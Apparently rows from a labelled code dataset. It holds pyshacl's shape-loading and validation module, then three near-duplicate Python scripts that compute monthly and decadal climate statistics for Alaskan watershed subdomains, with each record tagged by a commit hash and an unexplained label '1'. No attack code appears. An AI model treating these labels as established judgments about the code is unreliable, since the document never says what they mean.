                ""https://www.w3.org/TR/shacl/#property-shapes"")

    has_target_class = {s for s, o in g.subject_objects(SH_targetClass)}
    has_target_node = {s for s, o in g.subject_objects(SH_targetNode)}
    has_target_objects_of = {s for s, o in g.subject_objects(SH_targetObjectsOf)}
    has_target_subjects_of = {s for s, o in g.subject_objects(SH_targetSubjectsOf)}

    if infer_shapes:
        log.warning(""Inferring shapes is not yet supported"")

    other_shapes = set(has_target_class).union(set(has_target_node).union(set(has_target_objects_of).union(set(has_target_subjects_of))))
    found_node_shapes = set()
    found_prop_shapes = set()
    for s in other_shapes:
        if s in defined_node_shapes or s in defined_prop_shapes:
            continue
        path_vals = list(g.objects(s, SH_path))
        if len(path_vals) < 1:
            found_node_shapes.add(s)
        elif len(path_vals) > 1:
            raise ShapeLoadError(
                ""A PropertyShape cannot have more than one 'sh:path' predicate."",
                ""https://www.w3.org/TR/shacl/#property-shapes"")
        else:
            found_prop_shapes.add(s)
    created_node_shapes = {Shape(g, s, False) for s in defined_node_shapes.union(found_node_shapes)}
    created_prop_shapes = {Shape(g, s, True) for s in defined_prop_shapes.union(found_prop_shapes)}
    return list(created_node_shapes.union(created_prop_shapes))/n/n/n/pyshacl/validate.py/n/n# -*- coding: utf-8 -*-
import rdflib
import RDFClosure as owl_rl

from pyshacl.shape import find_shapes

if owl_rl.json_ld_available:
    import rdflib_jsonld

import logging

logging.basicConfig()
log = logging.getLogger(__name__)


class Validator(object):
    @classmethod
    def _load_default_options(cls, options_dict):
        options_dict['inference'] = True
        options_dict['abort_on_error'] = False

    @classmethod
    def _run_pre_inference(cls, target_graph):
        try:
            inferencer = owl_rl.DeductiveClosure(owl_rl.RDFS_OWLRL_Semantics)
        except Exception as e:
            log.error(""Error during creation of OWL-RL Deductive Closure"")
            raise e
        try:
            inferencer.expand(target_graph)
        except Exception as e:
            log.error(""Error while running OWL-RL Deductive Closure"")
            raise e

    def __init__(self, target_graph, *args, shacl_graph=None, options=None, **kwargs):
        if options is None:
            options = {}
        self._load_default_options(options)
        self.options = options
        assert isinstance(target_graph, rdflib.Graph),\
            ""target_graph must be a rdflib Graph object""
        self.target_graph = target_graph
        if shacl_graph is None:
            shacl_graph = target_graph
        assert isinstance(shacl_graph, rdflib.Graph),\
            ""shacl_graph must be a rdflib Graph object""
        self.shacl_graph = shacl_graph


    def run(self):
        if self.options['inference']:
            self._run_pre_inference(self.target_graph)
        shapes = find_shapes(self.shacl_graph)
        results = {}
        for s in shapes:
            r = s.validate(self.target_graph)
            results[s.node] = r
        return results

# TODO: check out rdflib.util.guess_format() for format. I think it works well except for perhaps JSON-LD
def _load_into_graph(target):
    if isinstance(target, rdflib.Graph):
        return target
    target_is_file = False
    target_is_text = False
    rdf_format = None
    if isinstance(target, str):
        if target.startswith('file://'):
            target_is_file = True
            target = target[7:]
        elif len(target) < 240:
            if target.endswith('.ttl'):
                target_is_file = True
                rdf_format = 'turtle'
            elif target.endswith('.xml'):
                target_is_file = True
                rdf_format = 'xml'
            elif target.endswith('.json'):
                target_is_file = True
                rdf_format = 'json-ld'
        if not target_is_file:
            target_is_text = True
    else:
        raise RuntimeError(""Cannot determine the format of the input graph"")
    g = rdflib.Graph()
    if target_is_file:
        import os
        file_name = os.path.abspath(target)
        with open(file_name, mode='rb') as file:
            g.parse(source=None, publicID=None, format=rdf_format,
                    location=None, file=file)
    elif target_is_text:
        g.parse(source=target)
    return g


def validate(target_graph, *args, shacl_graph=None, inference=True, abort_on_error=False, **kwargs):
    target_graph = _load_into_graph(target_graph)
    if shacl_graph is not None:
        shacl_graph = _load_into_graph(shacl_graph)
    validator = Validator(
        target_graph, shacl_graph,
        options={'inference': inference, 'abort_on_error': abort_on_error})
    return validator.run()


/n/n/n",1
184,10ef0417268197b2dcc85a791314fa55e74941dd,"snap_scripts/epscor_sc/model_diffs_metrics_epscor_sc.py/n/n# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def diff( x, y, *args, **kwargs ):
	'''
	difference between 2 np.arrays representing 
	2-D rasters in the format : GeoTiff

	ARGUMENTS:
	----------
	x = [str] path to the baseline GeoTiff
	y = [str] path to the modeled GeoTiff

	RETURNS:
	-------
	difference of the 2 arrays as a 2D numpy array
	( y - x )
	
	'''
	import rasterio
	baseline = rasterio.open( x ).read( 1 )
	modeled = rasterio.open( y ).read( 1 )
	return ( modeled - baseline  )

def wrap_diff( x ):
	''' simple wrapper for multiprocessing '''
	return diff( *x )

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		modeled = month_grouped[ month ]
		# change the model name to the baseline model in the series for comparison
		baseline = [ fn.replace( model, '5ModelAvg' ) for fn in modeled ]
		args = zip( baseline, modeled )

		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( wrap_diff, args ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }

if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cmip5'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'IPSL-CM5A-LR', 'MRI-CGCM3', 'GISS-E2-R', 'GFDL-CM3', 'NCAR-CCSM4' ]
	scenarios = [ 'historical', 'rcp26', 'rcp45', 'rcp60', 'rcp85' ]
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'
	
	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		print( variable )
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),\
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),(2000,2005)]
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),(2050, 2059),\
							(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]

			for decade in decades:
				if scenario == 'historical':
					begin = 1900
					end = 2005
				else:
					begin = 2006
					end = 2100
			
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )

				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it

					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )
		
		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadals', '5ModelAvg_diff','summaries', str(1900), str(2100) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')
/n/n/nsnap_scripts/epscor_sc/model_variability_metrics_epscor_sc_DECADAL_multidomain.py/n/n# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def f( x ):
	''' apply function for multiprocessing.pool 
		helps with clean i/o '''
	with rasterio.open( x ) as rst:
		arr = rst.read( 1 )
	return arr

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( f, month_grouped[ month ] ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }


if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cmip5'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'IPSL-CM5A-LR', 'MRI-CGCM3', 'GISS-E2-R', 'GFDL-CM3', 'NCAR-CCSM4', '5ModelAvg' ]
	scenarios = [ 'historical', 'rcp26', 'rcp45', 'rcp60', 'rcp85' ]
	begin_out = 1900
	end_out = 2100
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'

	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
	masks = subdomains.sub_domains

	# make sure no NoData pixels are in the domain
	nodata_mask = rst.read_masks( 1 ) # mask where zero
	for count, mask in enumerate( masks ):
		mask[ nodata_mask == 0 ] = 0
		masks[ count ] = mask

	for variable in variables:
		all_data = {}
		for model, scenario in itertools.product( models, scenarios ):
			if scenario == 'historical':
				decades = [(1900,1909),(1910, 1919),(1920, 1929),(1930, 1939),(1940, 1949),
							(1950, 1959),(1960, 1969),(1970, 1979),(1980, 1989),(1990, 1999),
							(2000,2005)]
			else:
				decades = [(2006,2009),(2010, 2019),(2020, 2029),(2030, 2039),(2040, 2049),
							(2050, 2059),(2060, 2069),(2070, 2079),(2080, 2089),(2090, 2099)]

			for decade in decades:
				if scenario == 'historical':
					begin = 1900
					end = 2005
				else:
					begin = 2006
					end = 2100
			
				print( 'running: {} {} {} {}'.format( model, variable, scenario, decade ) )

				for mask in masks:
					domain_num, = np.unique(mask[mask > 0])
					domain_name = subdomains.names_dict[ domain_num ].replace( ' ', '' )
					# run it
					all_data.update( get_metrics( base_path, variable, model, scenario, decade, mask, domain_name, ncpus ) )

		# write it out to disk
		if not os.path.exists( output_path ):
			os.makedirs( output_path )
		
		prefix = '_'.join([ variable, project, 'decadal', 'summaries', str(begin_out), str(end_out) ])

		# its LONG FORMAT output with all datas in rows for a single var/metric
		output_filename = os.path.join( output_path, prefix + '.json' )
		with open( output_filename, 'w' ) as out_json:
			json.dump( all_data, out_json )

		# now some panel-y stuff with the output JSON
		panel = pd.Panel( deepcopy( all_data ) ).copy()
		metrics = ['mean','max','min','stdev']
		for metric in metrics:
			df = panel[ :, metric, : ].T
			# sort the months
			df = df[ [ '01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12' ] ]
			output_filename = os.path.join( output_path, prefix + '_' + metric +'.csv' )
			if variable == 'pr':
				df = df.astype( np.float ).round( 0 ).astype( np.int )
				# output to csv -- int so no rounding needed.
				df.to_csv( output_filename, sep=',')
			else:
				df = df.astype( np.float32 )
				# round tas* to single decimal place
				df = df.copy().round( decimals=1 )
				# output ensuring single decimal place as string
				df.apply( lambda x: x.apply( lambda x: '%2.1f' % x) ).to_csv( output_filename, sep=',', float_format='%11.6f')
/n/n/nsnap_scripts/epscor_sc/model_variability_metrics_epscor_sc_DECADAL_multidomain_cru.py/n/n# maybe read in the baseline
# then loop through reads of all models...
# perform the diff
# then groupby month and compute means / stdev

def sort_files( files, split_on='_', elem_month=-2, elem_year=-1 ):
	'''
	sort a list of files properly using the month and year parsed
	from the filename.  This is useful with SNAP data since the standard
	is to name files like '<prefix>_MM_YYYY.tif'.  If sorted using base
	Pythons sort/sorted functions, things will be sorted by the first char
	of the month, which makes thing go 1, 11, ... which sucks for timeseries
	this sorts it properly following SNAP standards as the default settings.

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_month = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-2. For SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sorted `list` by month and year ascending. 

	'''
	import pandas as pd
	months = [ int(fn.split('.')[0].split( split_on )[elem_month]) for fn in files ]
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( {'fn':files, 'month':months, 'year':years} )
	df_sorted = df.sort_values( ['year', 'month' ] )
	return df_sorted.fn.tolist()

def only_years( files, begin=1901, end=2100, split_on='_', elem_year=-1 ):
	'''
	return new list of filenames where they are truncated to begin:end

	ARGUMENTS:
	----------
	files = [list] list of `str` pathnames to be sorted by month and year. usually from glob.glob.
	begin = [int] four digit integer year of the begin time default:1901
	end = [int] four digit integer year of the end time default:2100
	split_on = [str] `str` character to split the filename on.  default:'_', SNAP standard.
	elem_year = [int] slice element from resultant split filename list.  Follows Python slicing syntax.
		default:-1. For SNAP standard.

	RETURNS:
	--------
	sliced `list` to begin and end year.
	'''
	import pandas as pd
	years = [ int(fn.split('.')[0].split( split_on )[elem_year]) for fn in files ]
	df = pd.DataFrame( { 'fn':files, 'year':years } )
	df_slice = df[ (df.year >= begin ) & (df.year <= end ) ]
	return df_slice.fn.tolist()

class SubDomains( object ):
	'''
	rasterize subdomains shapefile to ALFRESCO AOI of output set
	'''
	def __init__( self, subdomains_fn, rasterio_raster, id_field, name_field, background_value=0, *args, **kwargs ):
		'''
		initializer for the SubDomains object
		The real magic here is that it will use a generator to loop through the 
		unique ID's in the sub_domains raster map generated.
		'''
		import numpy as np
		self.subdomains_fn = subdomains_fn
		self.rasterio_raster = rasterio_raster
		self.id_field = id_field
		self.name_field = name_field
		self.background_value = background_value
		self._rasterize_subdomains( )
		self._get_subdomains_dict( )

	def _rasterize_subdomains( self ):
		'''
		rasterize a subdomains shapefile to the extent and resolution of 
		a template raster file. The two must be in the same reference system 
		or there will be potential issues. 
		returns:
			numpy.ndarray with the shape of the input raster and the shapefile
			polygons burned in with the values of the id_field of the shapefile
		gotchas:
			currently the only supported data type is uint8 and all float values will be
			coerced to integer for this purpose.  Another issue is that if there is a value
			greater than 255, there could be some error-type issues.  This is something that 
			the user needs to know for the time-being and will be fixed in subsequent versions
			of rasterio.  Then I can add the needed changes here.
		'''
		import geopandas as gpd
		import numpy as np

		gdf = gpd.read_file( self.subdomains_fn )
		id_groups = gdf.groupby( self.id_field ) # iterator of tuples (id, gdf slice)

		out_shape = self.rasterio_raster.height, self.rasterio_raster.width
		out_transform = self.rasterio_raster.affine

		arr_list = [ self._rasterize_id( df, value, out_shape, out_transform, background_value=self.background_value ) for value, df in id_groups ]
		self.sub_domains = arr_list
	@staticmethod
	def _rasterize_id( df, value, out_shape, out_transform, background_value=0 ):
		from rasterio.features import rasterize
		geom = df.geometry
		out = rasterize( ( ( g, value ) for g in geom ),
							out_shape=out_shape,
							transform=out_transform,
							fill=background_value )
		return out
	def _get_subdomains_dict( self ):
		import geopandas as gpd
		gdf = gpd.read_file( self.subdomains_fn )
		self.names_dict = dict( zip( gdf[self.id_field], gdf[self.name_field] ) )

def f( x ):
	''' apply function for multiprocessing.pool 
		helps with clean i/o '''
	with rasterio.open( x ) as rst:
		arr = rst.read( 1 )
	return arr

def get_metrics( base_path, variable, model, scenario, decade, mask, domain_name=None, ncpus=32 ):
	'''
	main function to return monthly summary stats for the group
	as a `dict`
	'''
	decade_begin, decade_end = decade
	modeled_files = glob.glob( os.path.join( base_path, model, scenario, variable, '*.tif' ) )
	modeled_files = sort_files( only_years( modeled_files, begin=decade_begin, end=decade_end, split_on='_', elem_year=-1 ) )
	
	# groupby month here
	month_grouped = pd.Series( modeled_files ).groupby([ os.path.basename(i).split('_')[-2] for i in modeled_files ])
	month_grouped = { i:j.tolist() for i,j in month_grouped } # make a dict
	
	month_dict = {}
	for month in month_grouped:
		# get diffs in parallel
		pool = mp.Pool( ncpus )
		arr = np.array( pool.map( f, month_grouped[ month ] ) )
		pool.close()
		pool.join()
		pool.terminate()
		pool = None

		# this derives a mean from 3D (time, x, y) to 2D (x, y)
		mean_arr = np.mean( arr, axis=0 )
		arr = None
		masked = np.ma.masked_array( mean_arr, mask == 0 )

		# calculate metrics across the 2D space
		month_dict[ str(month) ] = { 'stdev':str( np.std( masked ) ),
									'mean':str( np.mean( masked ) ),
									'min':str( np.min( masked ) ),
									'max':str( np.max( masked ) ) }

		# domain_name
		if domain_name == None:
			domain_name, = str( np.unique( mask > 0 ) )
	
	return { '_'.join([ model, scenario, variable, domain_name, str(decade_begin), str(decade_end) ]) : month_dict }


if __name__ == '__main__':
	import os, glob, itertools, rasterio, json
	from copy import deepcopy
	import xarray as xr
	import numpy as np
	import pandas as pd
	from pathos import multiprocessing as mp

	# setup args
	base_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled'
	output_path = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/derived/tabular'
	ncpus = 32
	project = 'cru'
	variables = [ 'tasmin', 'tasmax', 'tas', 'pr' ]
	models = [ 'ts323' ]
	scenarios = [ 'historical' ]
	begin_out = 1901
	end_out = 2014
	template_rst = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/EPSCOR_SC_DELIVERY_AUG2016/downscaled/NCAR-CCSM4/historical/tasmax/tasmax_mean_C_ar5_NCAR-CCSM4_historical_01_1901.tif'
	rst = rasterio.open( template_rst )
	# subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/Kenai_StudyArea.shp'
	subdomain_fn = '/workspace/Shared/Tech_Projects/EPSCoR_Southcentral/project_data/SCTC_studyarea/SCTC_watersheds.shp'

	# create the rasterized version of the input shapefile for spatial query
	# subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='OBJECTID', background_value=0 )
	subdomains = SubDomains( subdomain_fn, rst, id_field='OBJECTID', name_field='HU_12_Name', background_value=0 )
